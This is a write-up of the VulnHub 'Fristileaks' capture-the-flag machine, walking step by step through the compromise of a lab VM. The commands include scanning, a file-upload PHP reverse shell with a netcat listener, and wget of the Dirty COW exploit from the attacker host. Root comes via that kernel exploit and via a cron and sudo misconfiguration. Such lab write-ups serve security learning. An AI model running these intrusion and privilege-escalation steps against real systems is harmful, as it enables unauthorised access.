---
title: "Fristileaks"
date: 2024-06-29
draft: false
summary: "Writeup for Fristileaks CTF challenge on VulnHub."
tags: ["linux", "file upload", "kernel exploit", "sudo", "cron"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/fristileaks/cover.webp"
  caption: "Fristileaks VulnHub Challenge"
  alt: "Fristileaks cover"
platform: "VulnHub"
---

Fristileaks is an easy boot2root challenge. The goal of this challenge is to capture the flag from the */root* directory.
<!--more-->
To download **Fristileaks**, click on the link given below:
- https://www.vulnhub.com/entry/fristileaks-13,133/

## Reconnaissance

I started by performing a network scan using **netdiscover** to identify the target IP.

```bash
netdiscover -r 192.168.1.0/24 
```

I then performed an **nmap** aggressive scan to identify open ports and the services running on them.

```shell
nmap -A -p- TARGET -T4 -oN leaks.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |

![](https://cdn.ziomsec.com/fristileaks/1.webp)

## Initial Foothold

I visited the web application running on the target through my browser.

![](https://cdn.ziomsec.com/fristileaks/2.webp)

I then performed a **ffuf** scan to find hidden files on the web server.

```shell
ffuf -u http://TARGET/fuzz -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
```

![](https://cdn.ziomsec.com/fristileaks/3.webp)

**ffuf** identified 2 files. I navigated to *robots.txt* file to find more endpoints. 

```shell
curl http://TARGET/robots.txt
```

![](https://cdn.ziomsec.com/fristileaks/4.webp)

I accessed the endpoints found through *robots.txt* but did not find anything.

```shell
$ curl http://TARGET/cola
$ curl http://TARGET/sisi
$ curl http://TARGET/beer
```

![](https://cdn.ziomsec.com/fristileaks/5.webp)

![](https://cdn.ziomsec.com/fristileaks/6.webp)

Since none of the endpoints revealed anything, I tried using terms that were related to the VM ('fritisleaks', 'leaks', 'fristi' etc).
- I found a login panel at the *fristi* endpoint.

![](https://cdn.ziomsec.com/fristileaks/7.webp)

The source code revealed a potential username and some base64 encoded data.

![](https://cdn.ziomsec.com/fristileaks/8.webp)

![](https://cdn.ziomsec.com/fristileaks/9.webp)

I decoded this using a base64 decoder website. The header type revealed that this was an image.

![](https://cdn.ziomsec.com/fristileaks/10.webp)

Since it was a PNG image, I used a base64 to PNG converter to gather more information about it.

![](https://cdn.ziomsec.com/fristileaks/11.webp)

I attempted to log in using *`eezeepz | keKkeKKeKKeKkEkkEk`* and successfully gained access.

![](https://cdn.ziomsec.com/fristileaks/12.webp)

I clicked on the *upload file* link and accessed a file upload functionality.

![](https://cdn.ziomsec.com/fristileaks/13.webp)

I turned on Burp Suite and attempted to upload a text file, but encountered an error.

![](https://cdn.ziomsec.com/fristileaks/14.webp)

Upon changing the *filename*, I successfully uploaded the file.

![](https://cdn.ziomsec.com/fristileaks/15.webp)

Upon visiting the *Uploads/* directory, I received a text response.

![](https://cdn.ziomsec.com/fristileaks/16.webp)

Since, I had the ability to upload any files, I uploaded a **php reverse shell** and triggered it to get a reverse shell.

> **[revshells](https://www.revshells.com/)** can be used to configure the payload.

```shell
rlwrap nc -lnvp 8000
```

![](https://cdn.ziomsec.com/fristileaks/17.webp)

![](https://cdn.ziomsec.com/fristileaks/18.webp)

```shell
curl http://TARGET/fristi/uploads/exploit.php.png
```

![](https://cdn.ziomsec.com/fristileaks/19.webp)

## Privilege Escalation
### Kernel Exploitation

I viewed my kernel information and searched for exploits related to it on **Exploit-DB**.

```shell
uname -a
```

![](https://cdn.ziomsec.com/fristileaks/20.webp)

![](https://cdn.ziomsec.com/fristileaks/21.webp)

I downloaded the available exploit on the target system.

```shell
wget http://KALI:PORT/exploit.c
```

![](https://cdn.ziomsec.com/fristileaks/22.webp)

I then compiled it according to the instructions given in the payload script.

```shell
gcc -pthread exploit.c -o dirty -lcrypt
```

![](https://cdn.ziomsec.com/fristileaks/23.webp)

By executing the payload, a new user called *firefart* was added with a **uid** of 0.

```shell
$ ./dirty
$ su firefart
# enter password
```

![](https://cdn.ziomsec.com/fristileaks/24.webp)

Hence, I gained root access.
### Using Misconfigured CRON

I found a note in the */var/www/* directory.

```shell
cd /var/www
cat notes.txt
```

![](https://cdn.ziomsec.com/fristileaks/25.webp)

I navigated to the *eezeepz* directory and found another note.

```shell
cd /home/eezeepz
cat notes.txt
```

![](https://cdn.ziomsec.com/fristileaks/26.webp)

Hence, I added a payload to get a reverse shell in a file called *runthis*.

![](https://cdn.ziomsec.com/fristileaks/27.webp)

![](https://cdn.ziomsec.com/fristileaks/28.webp)

After a couple of minutes, I got a reverse shell.

![](https://cdn.ziomsec.com/fristileaks/29.webp)

I found encrypted data in the */home/admin* directory along with a Python script that encrypted it.

![](https://cdn.ziomsec.com/fristileaks/30.webp)

> - `base64string = base64.b64encode(str)` : encodes the string with base64.
> - `codes.encode(base64string[::-1], 'rot13')` : reverses the base64 encoded string and then encodes it with rot13.

To decode this, I wrote a simple Python script. This script can be downloaded from my Github 
- https://github.com/RIZZZIOM/fristidecoder.git 

> The file owner also gave me a hint about whose password was stored in these files.

![](https://cdn.ziomsec.com/fristileaks/31.webp)

![](https://cdn.ziomsec.com/fristileaks/32.webp)

I then switched to *fristigod*.

![](https://cdn.ziomsec.com/fristileaks/33.webp)

I found a binary running as **root** in */var/fristigod*

![](https://cdn.ziomsec.com/fristileaks/34.webp)

![](https://cdn.ziomsec.com/fristileaks/35.webp)

I tried executing it using the syntax shown above.

```shell
./doCron id
```

![](https://cdn.ziomsec.com/fristileaks/36.webp)

I looked at the users available on the system by viewing the */etc/passwd* file.

```shell
cat /etc/passwd
```

![](https://cdn.ziomsec.com/fristileaks/37.webp)

This file revealed a user called *fristi*, so I tried executing the command using it.

```shell
sudo -u fristi ./doCron id
# password revealed by custom python script.
```

![](https://cdn.ziomsec.com/fristileaks/38.webp)

Since this executed successfully, I used it to gain **root** access.

```shell
sudo -u fristi ./doCeon bash
```

![](https://cdn.ziomsec.com/fristileaks/39.webp)

Finally, I captured the flag from */root*.

![](https://cdn.ziomsec.com/fristileaks/40.webp)

## Closure

Here's a summary of how I compromised **fristileaks**:
- I discovered a login page at */fristi/*.
- Through the source code of the page, I found the username and password.
- I exploited a file upload vulnerability to gain a reverse shell.
- For privilege escalation, I pursued 2 approaches:
1. I utilized a kernel exploit.
   - I employed the **dirtycow** exploit from **exploit-db** to gain root access by creating a new user.
2. I exploited **cronjobs**.
   - Leveraging **cronjobs**, I accessed the *admin* user.
   - I discovered credentials for both *admin* and *fristigod* in the */admin* directory.
   - Switching to *fristigod*, I found a script running as root.
   - I used the script to achieve **root** access.
- Finally, I captured the flag from the */root* directory.

Thats it from my side, until next time :)

---
